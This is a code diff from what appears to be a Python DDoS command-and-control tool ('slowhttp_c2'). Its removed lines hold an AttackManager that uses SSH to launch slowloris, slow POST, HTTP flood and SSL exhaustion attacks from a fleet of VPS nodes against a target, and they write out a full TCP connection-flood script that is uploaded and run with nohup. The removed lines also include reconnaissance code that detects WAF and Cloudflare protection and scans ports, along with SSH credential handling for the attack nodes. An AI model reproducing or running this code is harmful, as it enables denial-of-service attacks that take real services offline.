-            110: "POP3",
-            111: "RPC",
-            135: "MSRPC",
-            139: "NetBIOS",
-            143: "IMAP",
-            443: "HTTPS",
-            445: "SMB",
-            993: "IMAPS",
-            995: "POP3S",
-            1723: "PPTP",
-            3306: "MySQL",
-            3389: "RDP",
-            5900: "VNC",
-            8080: "HTTP-Proxy"
-        }
-        return common_ports.get(port, "Unknown")
-    
-    def check_ssl(self, domain, port=443):
-        """Check SSL/TLS certificate information"""
-        logger.info(f"Checking SSL certificate for {domain}:{port}")
-        
-        results = {
-            "domain": domain,
-            "port": port,
-            "has_ssl": False,
-            "certificate": {},
-            "vulnerabilities": []
-        }
-        
-        try:
-            # Create SSL context
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            
-            # Connect to the server
-            with socket.create_connection((domain, port)) as sock:
-                with context.wrap_socket(sock, server_hostname=domain) as ssock:
-                    results["has_ssl"] = True
-                    
-                    # Get certificate
-                    cert = ssock.getpeercert(True)
-                    x509 = ssl.DER_cert_to_PEM_cert(cert)
-                    
-                    # Extract certificate information
-                    cert_info = ssock.getpeercert()
-                    
-                    # Process certificate information
-                    if cert_info:
-                        # Issuer
-                        issuer = dict(x[0] for x in cert_info['issuer'])
-                        results["certificate"]["issuer"] = issuer
-                        
-                        # Subject
-                        subject = dict(x[0] for x in cert_info['subject'])
-                        results["certificate"]["subject"] = subject
-                        
-                        # Validity
-                        results["certificate"]["not_before"] = cert_info['notBefore']
-                        results["certificate"]["not_after"] = cert_info['notAfter']
-                        
-                        # Check if certificate is expired
-                        not_after = cert_info['notAfter']
-                        expiry_date = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
-                        if expiry_date < datetime.now():
-                            results["vulnerabilities"].append("Certificate expired")
-                    
-                    # Check TLS version
-                    version = ssock.version()
-                    results["certificate"]["tls_version"] = version
-                    
-                    # Check for weak TLS versions
-                    if version in ["TLSv1", "TLSv1.1"]:
-                        results["vulnerabilities"].append(f"Weak TLS version: {version}")
-                    
-                    # Check cipher
-                    cipher = ssock.cipher()
-                    if cipher:
-                        results["certificate"]["cipher"] = cipher[0]
-                        
-                        # Check for weak ciphers
-                        weak_ciphers = ["RC4", "DES", "3DES", "MD5"]
-                        if any(wc in cipher[0] for wc in weak_ciphers):
-                            results["vulnerabilities"].append(f"Weak cipher: {cipher[0]}")
-        except ssl.SSLError as e:
-            logger.error(f"SSL error: {e}")
-            results["vulnerabilities"].append(f"SSL error: {str(e)}")
-        except socket.error as e:
-            logger.error(f"Socket error: {e}")
-        except Exception as e:
-            logger.error(f"Error checking SSL: {e}")
-        
-        return results
-    
-    def gather_target_info(self, target):
-        """Gather comprehensive information about a target"""
-        logger.info(f"Gathering information about {target}")
-        
-        # Normalize target (remove http:// or https://)
-        if target.startswith(('http://', 'https://')):
+        # Parse URL if provided
+        if target.startswith('http'):
             parsed = urlparse(target)
-            domain = parsed.netloc
-        else:
-            domain = target
+            target = parsed.hostname or parsed.netloc
         
-        # Remove port if present
-        if ':' in domain:
-            domain = domain.split(':')[0]
+        port_range = self.terminal.input_with_prompt("Enter port range (e.g., 80,443 or 1-1000): ", False) or "1-1000"
         
-        results = {
-            "domain": domain,
-            "ip_addresses": [],
-            "dns_records": {},
-            "web_server": None,
-            "waf_detected": False,
-            "waf_type": None,
-            "cloudflare_protected": False,
-            "open_ports": [],
-            "ssl_info": {},
-            "whois_info": {},
-            "scan_date": datetime.now().isoformat()
-        }
+        print(f"\n{Colors.YELLOW}[INFO] Scanning ports on {target}...{Colors.RESET}")
+        print(f"{Colors.YELLOW}[INFO] This may take some time depending on the port range...{Colors.RESET}")
         
-        # Get IP addresses
         try:
-            ip_addresses = socket.gethostbyname_ex(domain)[2]
-            results["ip_addresses"] = ip_addresses
-        except Exception as e:
-            logger.error(f"Error resolving domain: {e}")
-        
-        # Get DNS records
-        dns_results = self.lookup_dns_history(domain)
-        results["dns_records"] = dns_results["current_records"]
-        
-        # Check if behind Cloudflare
-        cf_results = self.detect_cloudflare(domain)
-        results["cloudflare_protected"] = cf_results["is_behind_cloudflare"]
-        
-        # Check for WAF
-        url = f"https://{domain}"
-        try:
-            waf_results = self.detect_waf(url)
-            results["waf_detected"] = waf_results["waf_detected"]
-            results["waf_type"] = waf_results["waf_type"]
-        except:
-            # Try HTTP if HTTPS fails
-            try:
-                url = f"http://{domain}"
-                waf_results = self.detect_waf(url)
-                results["waf_detected"] = waf_results["waf_detected"]
-                results["waf_type"] = waf_results["waf_type"]
-            except Exception as e:
-                logger.error(f"Error detecting WAF: {e}")
-        
-        # Check web server
-        if REQUESTS_AVAILABLE:
-            try:
-                response = requests.get(url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
-                results["web_server"] = response.headers.get('Server', 'Unknown')
-            except:
-                # Try HTTP if HTTPS fails
-                try:
-                    url = f"http://{domain}"
-                    response = requests.get(url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
-                    results["web_server"] = response.headers.get('Server', 'Unknown')
-                except Exception as e:
-                    logger.error(f"Error getting web server info: {e}")
-        
-        # Scan common ports
-        port_results = self.scan_ports(domain)
-        results["open_ports"] = port_results["open_ports"]
-        
-        # Check SSL
-        ssl_results = self.check_ssl(domain)
-        if ssl_results["has_ssl"]:
-            results["ssl_info"] = ssl_results["certificate"]
-        
-        # Get WHOIS information (placeholder)
-        results["whois_info"] = {
-            "registrar": "Example Registrar",
-            "creation_date": "2020-01-01",
-            "expiration_date": "2025-01-01"
-        }
-        
-        return results
-
-class AttackManager:
-    """Manages attack operations with enhanced monitoring and control"""
-    
-    def __init__(self, ssh_manager, db_manager):
-        """Initialize attack manager with SSH and database managers"""
-        self.ssh_manager = ssh_manager
-        self.db_manager = db_manager
-        self.active_attacks = {}
-        self.monitoring_threads = {}
-        self.status_check_interval = 5  # seconds
-        self.attack_methods = {
-            'slowloris': 'Slowloris (Header Injection)',
-            'slow_post': 'Slow POST (R.U.D.Y)',
-            'slow_read': 'Slow Read Attack',
-            'http_flood': 'HTTP Flood',
-            'ssl_exhaust': 'SSL/TLS Exhaustion',
-            'tcp_flood': 'TCP Connection Flood',
-            'dns_amplification': 'DNS Amplification'
-        }
-    
-    def get_available_attack_methods(self):
-        """Get list of available attack methods"""
-        return self.attack_methods
-    
-    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
-        """Launch attack with comprehensive error handling and auto-reconnect"""
-        
-        # Parse target URL properly
-        if target_url.startswith('http'):
-            parsed = urlparse(target_url)
-            target_host = parsed.hostname or parsed.netloc
-        else:
-            target_host = target_url.split(':')[0].split('/')[0]
-        
-        self.active_attacks[session_id] = {
-            'target_host': target_host,
-            'target_url': target_url,
-            'attack_type': attack_type,
-            'vps_list': vps_list,
-            'status': 'running',
-            'start_time': datetime.now(),
-            'parameters': parameters,
-            'vps_status': {}
-        }
-        
-        logger.info(f"Launching {attack_type} attack on {target_host}")
-        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
-        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 1000)}{Colors.RESET}")
-        
-        success_count = 0
-        failed_vps = []
-        
-        # Get all VPS data from database for reconnection
-        all_vps_data = {vps['ip_address']: vps for vps in self.db_manager.get_all_vps()}
-        
-        for vps_ip in vps_list:
-            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
+            results = self.network_tools.scan_ports(target, port_range)
             
-            # Check connection status and reconnect if necessary
-            if not self.ssh_manager.get_connection_status(vps_ip):
-                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
+            if results['open_ports']:
+                print(f"\n{Colors.GREEN}[RESULT] Open ports found:{Colors.RESET}")
                 
-                vps_data = all_vps_data.get(vps_ip)
-                if vps_data:
-                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
-                        vps_data['ip_address'], vps_data['username'], vps_data['password'], vps_data['ssh_port']
-                    )
-                    if reconnect_success:
-                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
-                        self.db_manager.update_vps_status(vps_ip, 'online')
-                    else:
-                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
-                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
-                        continue
-                else:
-                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
-                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
-                    continue
-            
-            # Build attack command
-            cmd = self._build_attack_command(target_url, attack_type, parameters)
-            
-            # Execute with longer timeout and better error detection
-            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
-            
-            # Better success detection
-            if success and self._is_attack_launched_successfully(output):
-                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
-                success_count += 1
+                # Convert to list of lists for table printing
+                headers = ["Port", "Service", "State", "Banner"]
+                data = []
                 
-                # Store VPS status in attack info
-                self.active_attacks[session_id]['vps_status'][vps_ip] = {
-                    'status': 'attacking',
-                    'launch_time': datetime.now().isoformat(),
-                    'pid': self._extract_pid(output)
-                }
+                for port_info in results['open_ports']:
+                    data.append([
+                        port_info['port'],
+                        port_info['service'] or 'unknown',
+                        f"{Colors.GREEN}open{Colors.RESET}",
+                        port_info['banner'] or ''
+                    ])
                 
-                # Verify agent is actually running
-                time.sleep(2)
-                verify_cmd = "ps aux | grep 'python.*agent.py' | grep -v grep | wc -l"
-                verify_success, verify_output = self.ssh_manager.execute_command(vps_ip, verify_cmd, timeout=10)
-                
-                if verify_success and verify_output.strip() != '0':
-                    print(f"  {Colors.GREEN}→ Agent verified running ({verify_output.strip()} processes){Colors.RESET}")
-                else:
-                    print(f"  {Colors.YELLOW}→ Warning: Agent verification failed{Colors.RESET}")
-                
+                self.terminal.print_table(headers, data)
             else:
-                print(f"{Colors.RED}FAILED{Colors.RESET}")
-                # Detailed error logging
-                error_details = self._analyze_launch_error(output)
-                failed_vps.append(f"{vps_ip}: {error_details}")
-        
-        # Update database with results
-        self.db_manager.update_attack_status(
-            session_id, 
-            'running' if success_count > 0 else 'failed',
-            {'success_count': success_count, 'failed_vps': failed_vps}
-        )
-        
-        if success_count > 0:
-            # Start monitoring thread
-            self._start_monitoring_thread(session_id)
+                print(f"\n{Colors.YELLOW}[RESULT] No open ports found in the specified range{Colors.RESET}")
             
-            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
-            if failed_vps:
-                print(f"{Colors.YELLOW}[FAILED VPS]:{Colors.RESET}")
-                for failure in failed_vps:
-                    print(f"  {failure}")
-            return True
-        else:
-            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
-            print(f"{Colors.YELLOW}[TROUBLESHOOTING TIPS]:{Colors.RESET}")
-            print(f"  1. Verify VPS connections: Option 2 - Test All Connections")
-            print(f"  2. Check agent deployment: Option 3 - Deploy Agents")
-            print(f"  3. Test single VPS: Option 5 - Test Single VPS")
-            for failure in failed_vps:
-                print(f"  {failure}")
-            return False
-    
-    def _extract_pid(self, output):
-        """Extract PID from launch output"""
-        pid_match = re.search(r'PID:\s*(\d+)', output)
-        if pid_match:
-            return pid_match.group(1)
-        return None
-    
-    def _is_attack_launched_successfully(self, output):
-        """Better detection of successful attack launch"""
-        success_indicators = [
-            "Attack launched with PID",
-            "SLOWLORIS] Starting attack",
-            "R.U.D.Y] Starting",
-            "nohup: ignoring input",
-            "Creating initial connections",
-            "Starting Slow Read attack",
-            "Starting HTTP Flood attack",
-            "Starting SSL/TLS exhaustion attack"
-        ]
-        
-        return any(indicator in output for indicator in success_indicators)
-    
-    def _analyze_launch_error(self, output):
-        """Analyze launch error for better debugging"""
-        if "Permission denied" in output:
-            return "Permission denied - check SSH credentials"
-        elif "No such file" in output:
-            return "Agent file not found - redeploy agent"
-        elif "python3: command not found" in output:
-            return "Python3 not installed on VPS"
-        elif "Connection refused" in output:
-            return "Target refuses connections"
-        elif "Traceback" in output:
-            return f"Python error - {output.split('Traceback')[1][:100]}..."
-        elif output.strip() == "":
-            return "Command executed but no output (timeout?)"
-        else:
-            return f"Unknown error - {output[:150]}..."
-    
-    def _build_attack_command(self, target_url, attack_type, parameters):
-        """Build attack command with better error handling and security"""
-        connections = max(1, parameters.get('connections', 100))
-        delay = max(0, parameters.get('delay', 15))
-        duration = parameters.get('duration', 0)
-        requests = parameters.get('requests', 1000)  # For HTTP flood
-        
-        # Clean target parsing
-        target_clean = target_url.replace('http://', '').replace('https://', '').split('/')[0]
-        
-        # Enhanced command with better logging
-        cmd = "cd /tmp/slowhttp_c2 && "
-        
-        # Check if agent exists
-        cmd += "if [ ! -f agent.py ]; then echo 'ERROR: agent.py not found'; exit 1; fi && "
-        
-        # Launch with nohup and proper logging
-        timestamp = int(time.time())
-        log_file = f"attack_{timestamp}.log"
-        
-        cmd += f"nohup python3 agent.py '{target_clean}' {attack_type} "
-        cmd += f"--connections {connections} --delay {delay} "
-        
-        # Add attack-specific parameters
-        if attack_type == 'http_flood':
-            cmd += f"--requests {requests} "
-        
-        if duration > 0:
-            cmd += f"--duration {duration} "
-        
-        # Better logging and PID capture
-        cmd += f"> {log_file} 2>&1 & "
-        cmd += "sleep 2 && "
-        cmd += "PID=$! && "
-        cmd += "echo 'Attack launched with PID:' $PID && "
-        cmd += "ps aux | grep 'python3.*agent.py' | grep -v grep | head -1"
-        
-        return cmd
-    
-    def _start_monitoring_thread(self, session_id):
-        """Start a background thread to monitor attack status"""
-        if session_id in self.monitoring_threads and self.monitoring_threads[session_id].is_alive():
-            return
+            print(f"\n{Colors.CYAN}[INFO] Scan completed in {results['scan_time']:.2f} seconds{Colors.RESET}")
             
-        def monitor_thread():
-            logger.info(f"Starting monitoring thread for session {session_id}")
-            while session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
-                try:
-                    status = self.get_attack_status(session_id)
-                    
-                    # Record status in database
-                    for vps_ip, vps_status in status.items():
-                        self.db_manager.record_attack_result(
-                            session_id,
-                            vps_ip,
-                            vps_status.get('active_processes', 0),
-                            vps_status.get('connections', 0),
-                            vps_status.get('status', 'unknown'),
-                            vps_status.get('bytes_sent', 0),
-                            vps_status.get('cpu_usage', None),
-                            vps_status.get('memory_usage', None),
-                            vps_status.get('errors', 0)
-                        )
-                    
-                    # Check if attack is still running
-                    active_vps = sum(1 for vs in status.values() if vs.get('status') == 'attacking')
-                    if active_vps == 0 and len(status) > 0:
-                        logger.info(f"Attack {session_id} appears to have stopped (no active VPS)")
-                        self.active_attacks[session_id]['status'] = 'completed'
-                        self.db_manager.update_attack_status(session_id, 'completed')
-                        break
-                        
-                except Exception as e:
-                    logger.error(f"Error in monitoring thread for session {session_id}: {str(e)}")
-                
-                time.sleep(self.status_check_interval)
-                
-            logger.info(f"Monitoring thread for session {session_id} stopped")
-        
-        # Start thread
-        thread = threading.Thread(target=monitor_thread, daemon=True)
-        thread.start()
-        self.monitoring_threads[session_id] = thread
-    
-    def stop_attack(self, session_id):
-        """Enhanced attack stopping with verification"""
-        if session_id not in self.active_attacks:
-            return False, "Attack session not found"
-        
-        vps_list = self.active_attacks[session_id]['vps_list']
-        
-        print(f"\n{Colors.YELLOW}[ATTACK] Stopping attack on all VPS nodes...{Colors.RESET}")
-        
-        stop_count = 0
-        for vps_ip in vps_list:
-            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
-            
-            # Enhanced process killing sequence
-            commands = [
-                "pkill -f 'python3.*agent.py' >/dev/null 2>&1 || true",
-                "sleep 1",
-                "pkill -9 -f 'agent.py' >/dev/null 2>&1 || true", 
-                "killall python3 >/dev/null 2>&1 || true",
-                "sleep 1",
-                # Verify cleanup
-                "ps aux | grep 'agent.py' | grep -v grep | awk '{print $2}' | xargs kill -9 >/dev/null 2>&1 || true",
-                "sleep 1",
-                "ps aux | grep 'agent.py' | grep -v grep | wc -l"
-            ]
-            
-            remaining_procs = None
-            for cmd in commands:
-                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
-                if "wc -l" in cmd and success and output.strip().isdigit():
-                    remaining_procs = int(output.strip())
-            
-            if remaining_procs is not None and remaining_procs == 0:
-                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
-                stop_count += 1
-            elif remaining_procs is not None and remaining_procs > 0:
-                print(f"{Colors.YELLOW}PARTIAL ({remaining_procs} remaining){Colors.RESET}")
-                stop_count += 1  # Still count as attempt
-            else:
-                print(f"{Colors.RED}FAILED{Colors.RESET}")
-        
-        self.active_attacks[session_id]['status'] = 'stopped'
-        self.active_attacks[session_id]['end_time'] = datetime.now()
-        
-        # Update database
-        self.db_manager.update_attack_status(
-            session_id, 
-            'stopped', 
-            {'stopped_vps': stop_count}
-        )
-        
-        print(f"\n{Colors.GREEN}[SUCCESS] Stop command sent to {stop_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
-        return True, f"Attack stopped on {stop_count} nodes"
-    
-    def get_attack_status(self, session_id):
-        """Enhanced attack status with better process detection and metrics"""
-        if session_id not in self.active_attacks:
-            return {}
-        
-        vps_list = self.active_attacks[session_id]['vps_list']
-        status = {}
-        
-        for vps_ip in vps_list:
-            # Multiple commands to detect running processes
-            commands = [
-                "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l",
-                "pgrep -f 'agent.py' 2>/dev/null | wc -l",
-                "netstat -an 2>/dev/null | grep ESTABLISHED | wc -l",
-                # Get status file if it exists
-                "cat /tmp/slowhttp_c2/status.json 2>/dev/null || echo '{}'"
-            ]
-            
-            active_processes = 0
-            established_connections = 0
-            status_data = {}
-            
-            for i, cmd in enumerate(commands):
-                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
-                if success:
-                    if i < 2 and output.strip().isdigit():  # Process count commands
-                        active_processes = max(active_processes, int(output.strip()))
-                    elif i == 2 and output.strip().isdigit():  # Network connections
-                        established_connections = int(output.strip())
-                    elif i == 3:  # Status file
-                        try:
-                            status_data = json.loads(output)
-                        except:
-                            status_data = {}
-            
-            # Get additional system info if processes are running
-            cpu_usage = None
-            memory_usage = None
-            if active_processes > 0:
-                # Get CPU usage
-                cpu_cmd = "top -bn1 | grep 'python3' | head -1 | awk '{print $9}'"
-                success, output = self.ssh_manager.execute_command(vps_ip, cpu_cmd)
-                if success and output.strip() and output.strip().replace('.', '', 1).isdigit():
-                    cpu_usage = float(output.strip())
-                
-                # Get memory usage
-                mem_cmd = "top -bn1 | grep 'python3' | head -1 | awk '{print $10}'"
-                success, output = self.ssh_manager.execute_command(vps_ip, mem_cmd)
-                if success and output.strip() and output.strip().replace('.', '', 1).isdigit():
-                    memory_usage = float(output.strip())
-            
-            # Combine all data
-            status[vps_ip] = {
-                'active_processes': active_processes,
-                'status': 'attacking' if active_processes > 0 else 'idle',
-                'connections': established_connections,
-                'connections_info': f"({established_connections} est. conns)" if established_connections > 0 else "",
-                'cpu_usage': cpu_usage,
-                'memory_usage': memory_usage,
-                'cpu_info': f" (CPU: {cpu_usage}%)" if cpu_usage is not None else "",
-                'bytes_sent': status_data.get('bytes_sent', 0),
-                'errors': status_data.get('errors', 0),
-                'uptime': status_data.get('uptime', 0)
-            }
-        
-        return status
-    
-    def get_attack_details(self, session_id):
-        """Get detailed information about an attack session"""
-        if session_id not in self.active_attacks:
-            # Try to get from database
-            session = self.db_manager.get_attack_session(session_id)
-            if not session:
-                return None
-            
-            # Convert database row to dictionary
-            attack_info = dict(session)
-            
-            # Parse JSON fields
-            for field in ['vps_nodes', 'parameters', 'results', 'target_info']:
-                if attack_info.get(field):
-                    try:
-                        attack_info[field] = json.loads(attack_info[field])
-                    except:
-                        attack_info[field] = {}
-            
-            return attack_info
-        
-        # Return active attack info
-        return self.active_attacks[session_id]
-    
-    def launch_tcp_flood(self, session_id, target_host, target_port, vps_list, parameters):
-        """Launch a TCP connection flood attack"""
-        connections = parameters.get('connections', 1000)
-        duration = parameters.get('duration', 0)
-        
-        success_count = 0
-        failed_vps = []
-        
-        print(f"\n{Colors.YELLOW}[ATTACK] Launching TCP Connection Flood on {target_host}:{target_port}{Colors.RESET}")
-        
-        for vps_ip in vps_list:
-            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
-            
-            # Check connection
-            if not self.ssh_manager.get_connection_status(vps_ip):
-                print(f"{Colors.RED}NOT CONNECTED{Colors.RESET}")
-                failed_vps.append(f"{vps_ip}: Not connected")
-                continue
-            
-            # Create TCP flood script
-            tcp_script = f'''#!/usr/bin/env python3
-import socket
-import threading
-import time
-import random
-import os
-
-target_host = "{target_host}"
-target_port = {target_port}
-connections = {connections}
-duration = {duration}
-active_connections = 0
-total_attempts = 0
-successful = 0
-failed = 0
-running = True
-lock = threading.Lock()
-
-def connection_worker():
-    global active_connections, total_attempts, successful, failed
-    
-    while running:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect((target_host, target_port))
-            
-            with lock:
-                active_connections += 1
-                total_attempts += 1
-                successful += 1
-            
-            # Keep connection open
-            while running:
-                try:
-                    # Send random data occasionally to keep connection alive
-                    if random.random() < 0.1:
-                        s.send(os.urandom(random.randint(1, 10)))
-                    time.sleep(1)
-                except:
-                    break
-                    
-            s.close()
-            with lock:
-                active_connections -= 1
-                
         except Exception as e:
-            with lock:
-                total_attempts += 1
-                failed += 1
-            time.sleep(0.1)
-
-# Start worker threads
-threads = []
-for _ in range(min(500, connections)):  # Limit concurrent threads
-    t = threading.Thread(target=connection_worker)
-    t.daemon = True
-    t.start()
-    threads.append(t)
-    time.sleep(0.01)  # Small delay between thread starts
-
-start_time = time.time()
-try:
-    while running:
-        # Check duration
-        if duration > 0 and time.time() - start_time > duration:
-            running = False
-            break
-            
-        # Print status
-        print(f"Active: {active_connections}, Attempts: {total_attempts}, Success: {successful}, Failed: {failed}")
+            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+            logger.error(f"Error in port scanning: {str(e)}")
+            logger.error(traceback.format_exc())
         
-        # Write status to file
-        with open("/tmp/slowhttp_c2/status.json", "w") as f:
-            import json
-            json.dump({
-                "active": active_connections,
-                "sent": total_attempts,
-                "errors": failed,
-                "bytes_sent": successful * 100,  # Estimate
-                "uptime": int(time.time() - start_time),
-                "timestamp": time.time()
-            }, f)
-            
-        time.sleep(5)
-except KeyboardInterrupt:
-    running = False
-
-print("Attack stopped")
-'''
-            
-            # Transfer and execute script
-            try:
-                # Create temp file
-                temp_file = f"/tmp/tcp_flood_{vps_ip.replace('.', '_')}.py"
-                with open(temp_file, 'w') as f:
-                    f.write(tcp_script)
-                
-                # Transfer to VPS
-                sftp = self.ssh_manager.connections[vps_ip].open_sftp()
-                sftp.put(temp_file, '/tmp/slowhttp_c2/tcp_flood.py')
-                sftp.close()
-                
-                # Clean up local file
-                os.remove(temp_file)
-                
-                # Make executable and run
-                self.ssh_manager.execute_command(vps_ip, "chmod +x /tmp/slowhttp_c2/tcp_flood.py")
-                success, output = self.ssh_manager.execute_command(
-                    vps_ip, 
-                    "cd /tmp/slowhttp_c2 && nohup python3 tcp_flood.py > tcp_flood.log 2>&1 & echo $!"
-                )
-                
-                if success and output.strip().isdigit():
-                    print(f"{Colors.GREEN}SUCCESS (PID: {output.strip()}){Colors.RESET}")
-                    success_count += 1
-                    
-                    # Store VPS status
-                    self.active_attacks[session_id]['vps_status'][vps_ip] = {
-                        'status': 'attacking',
-                        'launch_time': datetime.now().isoformat(),
-                        'pid': output.strip()
-                    }
-                else:
-                    print(f"{Colors.RED}FAILED{Colors.RESET}")
-                    failed_vps.append(f"{vps_ip}: Failed to start script")
-            
-            except Exception as e:
-                print(f"{Colors.RED}ERROR{Colors.RESET}")
-                failed_vps.append(f"{vps_ip}: {str(e)}")
-        
-        # Update database
-        self.db_manager.update_attack_status(
-            session_id, 
-            'running' if success_count > 0 else 'failed',
-            {'success_count': success_count, 'failed_vps': failed_vps}
-        )
-        
-        if success_count > 0:
-            print(f"\n{Colors.GREEN}[SUCCESS] TCP Flood launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
-            return True
-        else:
-            print(f"\n{Colors.RED}[FAILED] Could not launch TCP Flood on any VPS{Colors.RESET}")
-            return False
+        input("\nPress Enter to continue...")
     
-    def launch_dns_amplification(self, session_id, target_ip, vps_list, parameters):
-        """Launch a DNS amplification attack (simulation only)"""
-        # This is a placeholder for a DNS amplification attack
-        # In a real implementation, this would use DNS servers to amplify traffic
-        # For educational purposes, we'll just simulate it
+    def cloudflare_detector_tool(self):
+        """Cloudflare detector tool"""
+        self.terminal.clear_screen()
+        print(f"{Colors.BOLD}CLOUDFLARE DETECTOR TOOL{Colors.RESET}")
+        print("=" * 50)
         
-        print(f"\n{Colors.YELLOW}[ATTACK] Simulating DNS Amplification attack on {target_ip}{Colors.RESET}")
-        print(f"{Colors.RED}[WARNING] This is a simulated attack for educational purposes only{Colors.RESET}")
-        
-        success_count = 0
-        failed_vps = []
-        
-        # Update database to show the attack is running
-        self.db_manager.update_attack_status(
-            session_id, 
-            'running',
-            {'type': 'dns_amplification_simulation'}
-        )
-        
-        # Mark the attack as completed after a short delay
-        time.sleep(5)
-        
-        self.db_manager.update_attack_status(
-            session_id, 
-            'completed',
-            {'success_count': 0, 'message': 'DNS Amplification simulation completed'}
-        )
-        
-        print(f"\n{Colors.GREEN}[SUCCESS] DNS Amplification simulation completed{Colors.RESET}")
-        return True
-
-class SSHManager:
-    """Manages SSH connections with improved reliability and error handling"""
-    
-    def __init__(self, security_manager):
-        """Initialize SSH manager with security manager for password handling"""
-        self.security_manager = security_manager
-        self.connections = {}
-        self.connection_cache = {}  # Cache VPS credentials
-        self.connection_locks = {}  # Thread locks for connection operations
-        self.max_retries = 3
-        self.retry_delay = 2
-        self.connection_timeout = 15
-        self.command_timeout = 60
-        
-        # Check if SSH functionality is available
-        if not SSH_AVAILABLE:
-            logger.warning("SSH functionality is limited due to missing paramiko module")
-    
-    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=None):
-        """Connect to VPS with improved error handling and retry mechanism"""
-        if not SSH_AVAILABLE:
-            return False, "SSH functionality not available (paramiko module missing)"
-            
-        # Create a lock for this connection if it doesn't exist
-        if ip not in self.connection_locks:
-            self.connection_locks[ip] = threading.Lock()
-            
-        with self.connection_locks[ip]:
-            # Check if already connected
-            if ip in self.connections and self._check_connection_alive(ip):
-                return True, "Already connected"
-                
-            # Decrypt password
-            try:
-                password = self.security_manager.decrypt_password(encrypted_password)
-                if not password:
-                    return False, "Failed to decrypt password"
-                
-                # Cache credentials for auto-reconnect
-                self.connection_cache[ip] = {
-                    'username': username,
-                    'encrypted_password': encrypted_password,
-                    'port': port
-                }
-                
-                # Try to connect with retries
-                for attempt in range(self.max_retries):
-                    try:
-                        ssh = paramiko.SSHClient()
-                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                        
-                        # Connect with timeout
-                        connect_timeout = timeout or self.connection_timeout
-                        ssh.connect(
-                            hostname=ip,
-                            username=username,
-                            password=password,
-                            port=port,
-                            timeout=connect_timeout,
-                            allow_agent=False,
-                            look_for_keys=False
-                        )
-                        
-                        # Test connection with simple command
-                        stdin, stdout, stderr = ssh.exec_command("echo 'Connection test'", timeout=5)
-                        exit_status = stdout.channel.recv_exit_status()
-                        
-                        if exit_status != 0:
-                            ssh.close()
-                            if attempt < self.max_retries - 1:
-                                time.sleep(self.retry_delay)
-                                continue
-                            return False, "Connection test failed"
-                        
-                        # Store connection
-                        self.connections[ip] = ssh
-                        logger.info(f"Connected to VPS: {ip}")
-                        return True, "Connected successfully"
-                        
-                    except Exception as e:
-                        if attempt < self.max_retries - 1:
-                            logger.warning(f"Connection attempt {attempt+1} failed for {ip}: {str(e)}")
-                            time.sleep(self.retry_delay)
-                        else:
-                            logger.error(f"Failed to connect to {ip} after {self.max_retries} attempts: {str(e)}")
-                            return False, str(e)
-                            
-            except Exception as e:
-                logger.error(f"Connection error for {ip}: {str(e)}")
-                return False, str(e)
-    
-    def _check_connection_alive(self, ip):
-        """Check if SSH connection is still alive with improved reliability"""
-        if ip not in self.connections:
-            return False
-            
-        try:
-            transport = self.connections[ip].get_transport()
-            if transport is None or not transport.is_active():
-                return False
-                
-            # Test with a simple command
-            stdin, stdout, stderr = self.connections[ip].exec_command("echo 'test'", timeout=5)
-            exit_status = stdout.channel.recv_exit_status()
-            return exit_status == 0
-        except Exception:
-            return False
-    
-    def reconnect_vps(self, ip):
-        """Attempt to reconnect to VPS using cached credentials"""
-        if ip not in self.connection_cache:
-            return False, "No cached credentials for this VPS"
-        
-        # Close existing connection if any
-        self.disconnect_vps(ip)
-        
-        cached = self.connection_cache[ip]
-        return self.connect_vps(
-            ip, 
-            cached['username'], 
-            cached['encrypted_password'], 
-            cached['port']
-        )
-    
-    def disconnect_vps(self, ip):
-        """Disconnect from VPS with proper cleanup"""
-        if ip in self.connections:
-            try:
-                self.connections[ip].close()
-                del self.connections[ip]
-                logger.info(f"Disconnected from VPS: {ip}")
-                return True
-            except Exception as e:
-                logger.error(f"Error disconnecting from {ip}: {str(e)}")
-        return False
-    
-    def execute_command(self, ip, command, timeout=None, auto_reconnect=True):
-        """Execute command with auto-reconnect capability and improved error handling"""
-        if not SSH_AVAILABLE:
-            return False, "SSH functionality not available (paramiko module missing)"
-            
-        # Check if connection exists, try to reconnect if not
-        if ip not in self.connections or not self._check_connection_alive(ip):
-            if auto_reconnect:
-                logger.info(f"No active connection to {ip}, attempting reconnect...")
-                success, message = self.reconnect_vps(ip)
-                if not success:
-                    return False, f"Reconnection failed: {message}"
